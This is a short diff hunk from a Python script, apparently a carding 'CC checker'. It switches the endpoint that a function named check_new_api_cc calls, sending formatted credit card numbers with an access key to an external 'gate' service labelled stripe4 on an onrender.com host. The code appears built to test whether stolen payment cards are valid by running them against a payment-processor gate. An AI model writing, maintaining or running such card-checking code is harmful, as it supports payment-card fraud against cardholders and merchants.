@@ -520,7 +520,7 @@ def check_new_api_cc(cc):
         # API request
         try:
             response = requests.get(
-                f"https://paypal-ox9w.onrender.com/gate=1/key=darkwaslost/cc={formatted_cc}",
+                f"https://api-sp-storm.onrender.com/gate=stripe4/keydarkwaslost/cc={formatted_cc}",
                 timeout=120
             )
             if response.status_code == 200:
